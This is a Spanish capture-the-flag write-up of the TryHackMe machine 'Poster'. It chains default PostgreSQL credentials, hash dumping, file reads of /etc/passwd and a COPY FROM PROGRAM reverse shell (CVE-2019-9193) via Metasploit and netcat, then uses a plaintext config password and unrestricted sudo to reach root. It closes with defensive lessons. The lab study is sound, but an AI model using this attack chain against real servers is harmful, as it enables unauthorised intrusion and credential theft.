Poster es una máquina Linux Easy de TryHackMe que es, de principio a fin, una lección sobre una sola mala configuración: un servidor **PostgreSQL** expuesto a la red con credenciales por defecto. Desde `postgres:password` la máquina entera se deshilacha — volcamos los hashes de contraseña de la base de datos, leemos ficheros arbitrarios del disco, y finalmente convertimos la funcionalidad `COPY ... FROM PROGRAM` de PostgreSQL (**CVE-2019-9193**) en una reverse shell como el usuario `postgres`. Desde ahí, el `config.php` de una aplicación web entrega una contraseña reutilizada para la cuenta `alison`, y `alison` tiene `sudo` sin restricciones — así que root está a un solo comando.

## Reconocimiento y Enumeración

### Escaneo de Puertos

Un escaneo TCP completo con detección de servicios y scripts por defecto. `-p-` cubre los 65.535 puertos, `-sCV` lanza los scripts NSE por defecto más la detección de versiones, y `-Pn` salta el descubrimiento de host ya que la máquina respondió al ping.

```bash
sudo nmap -p- -sCV -Pn -n 10.129.172.182 -oN nmap
```

```bash
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http       Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Poster CMS
|_http-server-header: Apache/2.4.18 (Ubuntu)
5432/tcp open  postgresql PostgreSQL DB 9.5.8 - 9.5.10 or 9.5.17 - 9.5.23
```

Tres servicios, pero uno destaca de inmediato: **PostgreSQL en el 5432 está expuesto a la red**. Una base de datos casi nunca debería ser accesible directamente desde fuera del host, y cuando lo es, las credenciales débiles o por defecto son lo primero que hay que probar. La aplicación web ("Poster CMS") y SSH quedan anotados, pero PostgreSQL es la pista obvia.

## Acceso Inicial — CVE-2019-9193 (RCE de `COPY FROM PROGRAM` de PostgreSQL) como `postgres`

Todo en esta sección va a través de los módulos de PostgreSQL de Metasploit, así que trabajamos desde `msfconsole` y fijamos el objetivo una vez, de forma global, para que cada módulo lo herede.

### Credenciales por defecto

```bash
msf > use auxiliary/scanner/postgres/postgres_login
msf auxiliary(scanner/postgres/postgres_login) > setg RHOSTS 10.129.172.182
msf auxiliary(scanner/postgres/postgres_login) > run
```

- **`use auxiliary/scanner/postgres/postgres_login`** carga el scanner de credenciales de PostgreSQL, que prueba una lista interna de pares usuario/contraseña comunes.
- **`setg RHOSTS 10.129.172.182`** fija el objetivo de forma **global** (`setg` en vez de `set`), para que los otros módulos de postgres que carguemos después no necesiten reescribirlo.
- **`run`** lanza el ataque. Encuentra el login por defecto del superusuario enseguida:

```bash
[+] 10.129.172.182:5432 - Login Successful: postgres:password@template1
```

**`postgres:password`** — la cuenta por defecto del superusuario de PostgreSQL, nunca cambiada. Con un login de superusuario, el resto de módulos de base de datos quedan abiertos para nosotros.

### Confirmar el acceso y volcar hashes

Una comprobación rápida de que podemos ejecutar SQL, y luego un volcado de los hashes de contraseña almacenados:

```bash
msf > use auxiliary/admin/postgres/postgres_sql
msf auxiliary(admin/postgres/postgres_sql) > run
# Query Text: 'select version()'
# PostgreSQL 9.5.21 on x86_64-pc-linux-gnu ...
```

- **`auxiliary/admin/postgres/postgres_sql`** ejecuta una sentencia SQL arbitraria (por defecto `select version()`) para confirmar que las credenciales dan acceso de consulta de verdad.

```bash
msf > use auxiliary/scanner/postgres/postgres_hashdump
msf auxiliary(scanner/postgres/postgres_hashdump) > run
```

- **`auxiliary/scanner/postgres/postgres_hashdump`** lee la tabla `pg_shadow`/`pg_authid` e imprime el hash MD5 de la contraseña de cada rol:

```bash
Username   Hash
```

Estos hashes MD5 de PostgreSQL se podrían crackear offline, pero no nos hacen falta — el acceso de superusuario nos da rutas mucho más directas.

### Leer ficheros del disco

Como superusuario, PostgreSQL puede leer ficheros locales a una tabla. El módulo `postgres_readfile` lo envuelve en un `COPY` de `/etc/passwd`:

```bash
msf > use auxiliary/admin/postgres/postgres_readfile
msf auxiliary(admin/postgres/postgres_readfile) > run
```

- **`auxiliary/admin/postgres/postgres_readfile`** crea una tabla temporal y ejecuta `COPY <tabla> FROM '/etc/passwd'`, y luego la vuelve a seleccionar — dejándonos leer cualquier fichero al que el proceso `postgres` tenga acceso.

```bash
#/home/dark/credentials.txt
alison:x:1000:1000:Poster,,,:/home/alison:/bin/bash
dark:x:1001:1001::/home/dark:
postgres:x:109:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
root:x:0:0:root:/root:/bin/bash
```

Dos usuarios interactivos destacan — **`alison`** y **`dark`** — más un comentario sugerente justo arriba apuntando a `/home/dark/credentials.txt`. Leer ficheros es útil, pero lo que de verdad queremos es ejecución de código.

### `COPY FROM PROGRAM` → reverse shell

PostgreSQL 9.3+ permite a un superusuario ejecutar `COPY ... FROM PROGRAM '<cmd>'`, que ejecuta un comando de shell como la cuenta de servicio de la base de datos. Esto es **CVE-2019-9193**, y Metasploit lo automatiza. Como el handler automático de reverse-TCP no pudo hacer bind aquí (el puerto ya estaba en uso localmente), recibimos la shell con nuestro propio listener de `netcat` y apuntamos el payload hacia él:

```bash
# listener en otra terminal
nc -nvlp 4444
```

```bash
msf > use exploit/multi/postgres/postgres_copy_from_program_cmd_exec
msf exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > run
```

```bash
[+] 10.129.172.182:5432 - EWtld6VF6Y created successfully
[+] 10.129.172.182:5432 - EWtld6VF6Y copied successfully(valid syntax/command)
[*] Exploit Succeeded
```

- **`exploit/multi/postgres/postgres_copy_from_program_cmd_exec`** realiza el truco de `COPY FROM PROGRAM`: crea una tabla temporal, ejecuta nuestro comando a través de ella y limpia después. El comando es una reverse shell de vuelta a nuestro listener.

El listener la recibe:

```bash
Connection received on 10.129.172.182 38864
whoami
postgres
```

Una shell como **`postgres`**. Tras el habitual tratamiento de la TTY (`python3 -c 'import pty; pty.spawn("/bin/bash")'`, luego `stty raw -echo`), podemos enumerar como es debido.

## Movimiento Lateral — `postgres` → `alison`

La aplicación web Poster CMS guarda sus credenciales de base de datos en texto claro, como hacen las apps en PHP. Leer su fichero de configuración entrega una contraseña que funciona:

```bash
postgres@ubuntu:/$ cat /var/www/html/config.php
```

```php
<?php
	$dbhost = "127.0.0.1";
	$dbuname = "alison";
	$dbpass = "p4ssw0rdS3cur3!#";
	$dbname = "mysudopassword";
?>
```

Dos cosas hacen de esto el pivote. El usuario es **`alison`** — una usuaria interactiva real que vimos en `/etc/passwd` — y el nombre de la base de datos es una pista nada sutil: **`mysudopassword`**. La contraseña `p4ssw0rdS3cur3!#` estaba reutilizada como el login de sistema de alison, así que funciona con `su`:

```bash
postgres@ubuntu:/$ su alison
Password: p4ssw0rdS3cur3!#
alison@ubuntu:~$ cat user.txt
REDACTED
```

## Escalada de Privilegios — `alison` → `root` (sudo)

La pista de `mysudopassword` da sus frutos de inmediato. Comprobando los permisos sudo de alison:

```bash
alison@ubuntu:~$ sudo -l
```

```bash
User alison may run the following commands on ubuntu:
    (ALL : ALL) ALL
```

**`(ALL : ALL) ALL`** significa que alison puede ejecutar *cualquier* comando como *cualquier* usuario, incluido root, sin restricciones. Ese es el nivel más alto de acceso sudo que existe, así que convertirse en root es un solo comando:

```bash
alison@ubuntu:~$ sudo su
root@ubuntu:/home/alison# whoami
root
root@ubuntu:~# cat root.txt
REDACTED
```

## Conclusiones Clave

- **Nunca expongas una base de datos a la red.** PostgreSQL en el 5432, accesible desde fuera del host, fue todo el foothold. Una base de datos debería escuchar en localhost (o en una interfaz interna bien restringida) y estar detrás de la aplicación, nunca ser directamente accesible por un atacante.
- **Las credenciales por defecto son un compromiso total, no un aviso.** `postgres:password` no fue solo una fuga de información — como superusuario desbloqueó lecturas de ficheros, volcados de hashes y, a través de `COPY FROM PROGRAM`, ejecución remota de código. Cambia cada credencial por defecto, y trata el acceso de superusuario a la base de datos como equivalente al acceso de shell en el host.
- **`COPY FROM PROGRAM` es RCE por diseño.** CVE-2019-9193 es en realidad la observación de que un superusuario de PostgreSQL puede ejecutar comandos del SO como la cuenta de servicio — una funcionalidad legítima con un alcance peligroso. Si la cuenta de la BD tiene demasiados privilegios y está expuesta, esa funcionalidad se convierte en una reverse shell.
- **Las credenciales en texto claro en ficheros de configuración encadenan cuentas.** El `config.php` de la app web guardaba la contraseña de alison en texto plano, y esa única contraseña reutilizada puenteó `postgres` → `alison`. Los secretos de una aplicación merecen la misma protección que cualquier otra credencial, y reutilizar una contraseña de base de datos para un login de shell colapsa dos fronteras de confianza separadas en una sola.
- **Un `sudo` sin restricciones es game over.** Una vez en `alison`, `(ALL : ALL) ALL` hizo root trivial. Las reglas de sudo deberían conceder los comandos específicos mínimos que un usuario necesita — un `ALL` general es indistinguible de repartir la contraseña de root.
